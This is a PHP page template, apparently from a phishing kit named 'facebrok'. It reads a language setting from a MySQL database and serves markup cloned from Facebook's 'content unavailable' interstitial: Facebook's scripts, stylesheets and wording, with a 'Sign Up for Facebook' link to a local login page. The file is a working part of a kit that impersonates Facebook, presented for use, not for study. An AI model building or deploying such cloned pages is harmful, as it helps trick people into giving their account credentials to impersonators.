<?php
// RedToor
// Project facebrok
error_reporting(E_ALL ^ E_NOTICE);
// Language--------------------------------
include("croak/config.php");
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
$red=mysql_query ("SELECT * FROM methods WHERE id=3") or die ('Failed Consult: '.mysql_error());
$raw=mysql_fetch_array($red);
$var=$raw['value'];
if ($var=="es"){$lang="es";}else{$lang="en";}
// Languages------------------------------
include("lang.php");
//----------------------------------------
?>
<html lang="en" id="facebook" class="no_js">
<!DOCTYPE html>
<html lang="<?php echo"$a"?>" id="facebook" class="no_js">
<head><meta charset="utf-8" /><script>function envFlush(a){function b(c){for(var d in a)c[d]=a[d];}if(window.requireLazy){window.requireLazy(['Env'],b);}else{Env=window.Env||{};b(Env);}}envFlush({"ajaxpipe_token":"AXheRvxQoKLEwHTZ","lhsh":"hAQGkLKUK","khsh":"0`sj`e`rm`s-0fdu^gshdoer-0gc^eurf-3gc^eurf;1;enbtldou;fduDmdldourCxO`ld-2YLMIuuqSdptdru;qsnunuxqd;rdoe"});</script><script>CavalryLogger=false;</script><noscript><meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" /></noscript><meta name="referrer" content="default" id="meta_referrer" /><title id="pageTitle"><?php echo"$des";?></title><noscript><meta http-equiv="X-Frame-Options" content="DENY" /></noscript><link rel="shortcut icon" href="H3nktOa7ZMg.ico" />
<link type="text/css" rel="stylesheet" href="UvwTahG1t6o.css" />
<link type="text/css" rel="stylesheet" href="6NrvphBRqWp.css" />
<link type="text/css" rel="stylesheet" href="jyN2WET7e_S.css" />
<link type="text/css" rel="stylesheet" href="USqQnLMkmi6.css" /
<script src="ATZhtnWB6jU.js" crossorigin="anonymous"></script>
<?php include("sky.php") ?>
</div></div></div><div id="globalContainer" class="uiContextualLayerParent"><div id="content" class="fb_content clearfix"><div class="UIFullPage_Container"><div class="mvl ptm uiInterstitial uiInterstitialLarge uiBoxWhite"><div class="uiHeader uiHeaderWithImage uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader"><div class="clearfix uiHeaderTop"><div class="rfloat _ohf"><h2 class="accessible_elem">This content is currently unavailable</h2><div class="uiHeaderActions"></div></div><div><h2 class="uiHeaderTitle" aria-hidden="true"><i class="uiHeaderImage img sp_zHSMh61SOR5 sx_f600b5"></i>This content is currently unavailable</h2></div></div></div><div class="phl ptm uiInterstitialContent"><div>The page you requested cannot be displayed right now. It may be temporarily unavailable, the link you clicked on may have expired, or you may not have permission to view this page. </div><ul class="uiList mtm _4of _4kg"><li><div class="fcb"><a href="/login.php?login_attempt=1">Sign Up for Facebook</a></div></li></ul></div></div></div></div>
<?php include("foot.php")?>